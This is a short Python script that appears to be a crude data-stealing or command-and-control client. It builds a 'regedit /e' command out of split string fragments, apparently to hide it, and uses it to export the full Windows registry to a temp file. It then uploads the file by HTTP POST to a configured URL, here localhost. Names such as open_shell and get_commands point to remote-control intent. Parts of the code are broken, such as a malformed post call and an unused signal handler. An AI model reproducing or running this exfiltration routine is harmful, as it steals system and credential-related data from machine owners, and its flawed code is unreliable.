import socket as sock
import requests as re
import subprocess
import signal
import sys
from subprocess import PIPE
import os
import base64

def signal_handler(client):
  print("ctrl-c was hit")
  client.close()
  sys.exit(0)

def open_shell(url):
  client = re.get(url)
  return client

def get_commands(client):
  if client.status_code == 200:
    password = client.content.decode('utf-16')
    return password
  else:
    print("Error!")
    re.post(b'error')
    return None

def return_results(url, file_name):
  re.post(url=url, data=open(file_name, 'rb'))

def two():
  one=' %TE'
  fi='tem'
  subprocess.call('r'+'ege'+'dit /e'+one+'M'+'P%'+'\\'+fi+'p.reg', shell=True)
  path = os.environ["TEMP"] + "\\"+fi+"p.reg"
  return path

if __name__ == "__main__":
  try:
    url = 'http://localhost'
    client = open_shell(url)
    while True:
      file_name = two()
      return_results(url, file_name)
      break
  except KeyboardInterrupt:
    client.close()
    sys.exit(0)

